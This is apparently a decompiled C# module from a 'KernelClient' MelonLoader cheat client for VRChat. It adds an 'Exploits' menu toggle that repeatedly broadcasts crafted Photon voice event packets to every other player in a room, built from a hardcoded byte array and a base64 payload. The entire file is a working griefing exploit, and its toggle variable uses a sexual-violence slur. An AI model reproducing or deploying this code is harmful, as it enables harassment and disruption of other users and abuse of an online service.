using System;
using ExitGames.Client.Photon;
using Il2CppSystem;
using KernelClient.Wrapper;
using MelonLoader;
using Photon.Pun;
using Photon.Realtime;
using UnhollowerBaseLib;
using VRC.SDKBase;

namespace KernelClient.Modules.Exploits.EONECOLLECTION
{
	// Token: 0x020000AF RID: 175
	internal class Kemono : KernelModule
	{
		// Token: 0x060004A6 RID: 1190 RVA: 0x00003A68 File Offset: 0x00001C68
		public override void OnUiManagerInit()
		{
			MenuSetup._uiManager.QMMenu.GetCategoryPage(PageNames.Exploits).GetCategory(CatagoryNames.EONEcollection).AddToggle("Kemono", "Kemono E1", delegate(bool isActive)
			{
				this.voiceRape = isActive;
				ToastNotif.Toast("Kemono is " + isActive.ToString(), null, null, 5f);
			}, false);
		}

		// Token: 0x060004A7 RID: 1191 RVA: 0x0001B070 File Offset: 0x00019270
		public override void OnUpdate()
		{
			bool flag = !this.voiceRape;
			if (!flag)
			{
				this.maxeventnum++;
				bool flag2 = this.maxeventnum > 1000;
				if (!flag2)
				{
					bool flag3 = this.maxeventnum > 1800;
					if (flag3)
					{
						this.maxeventnum = 0;
					}
					else
					{
						try
						{
							byte[] array = ((this.random.Next(2) == 0) ? this.PreparePacket() : this.voiceData);
							Il2CppStructArray<byte> il2CppStructArray = new Il2CppStructArray<byte>((long)array.Length);
							for (int i = 0; i < array.Length; i++)
							{
								il2CppStructArray[i] = array[i];
							}
							Object @object = il2CppStructArray.Cast<Object>();
							RaiseEventOptions raiseEventOptions = new RaiseEventOptions
							{
								field_Public_ReceiverGroup_0 = 1,
								field_Public_EventCaching_0 = 0
							};
							PhotonNetwork.Method_Public_Static_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(1, @object, raiseEventOptions, default(SendOptions));
						}
						catch (Exception ex)
						{
							MelonLogger.Error(string.Format("[KE1 Module] Error during packet send: {0}", ex));
						}
					}
				}
			}
		}

		// Token: 0x060004A8 RID: 1192 RVA: 0x0001B188 File Offset: 0x00019388
		private byte[] PreparePacket()
		{
			byte[] array = (byte[])this.basePacket.Clone();
			byte[] bytes = BitConverter.GetBytes(PhotonNetwork.field_Public_Static_LoadBalancingClient_0.field_Private_LoadBalancingPeer_0.ServerTimeInMilliSeconds);
			byte[] bytes2 = BitConverter.GetBytes(Networking.LocalPlayer.playerId);
			Buffer.BlockCopy(bytes2, 0, array, 0, bytes2.Length);
			Buffer.BlockCopy(bytes, 0, array, 4, bytes.Length);
			return array;
		}

		// Token: 0x04000329 RID: 809
		private bool voiceRape = false;

		// Token: 0x0400032A RID: 810
		private int maxeventnum = 0;

		// Token: 0x0400032B RID: 811
		private readonly byte[] basePacket = new byte[]
		{
			86, 0, 0, 0, 201, 60, 74, 145, 187, 134,
			59, 0, 248, 125, 232, 192, 92, 160, 82, 254,
			48, 228, 30, 187, 149, 196, 177, 215, 140, 223,
			127, 209, 66, 60, 0, 226, 53, 180, 176, 97,
			104, 4, 248, 238, 195, 125, 44, 185, 182, 68,
			94, 114, 205, 181, 150, 56, 232, 126, 247, 155,
			123, 172, 108, 98, 80, 56, 113, 89, 160, 125,
			221
		};

		// Token: 0x0400032C RID: 812
		private readonly byte[] voiceData = Convert.FromBase64String("AAAAAGfp+Lv2GRkA+MrI08yxTwBkxqwATk9LRU0wTk9LM00wTg==");

		// Token: 0x0400032D RID: 813
		private Random random = new Random();
	}
}
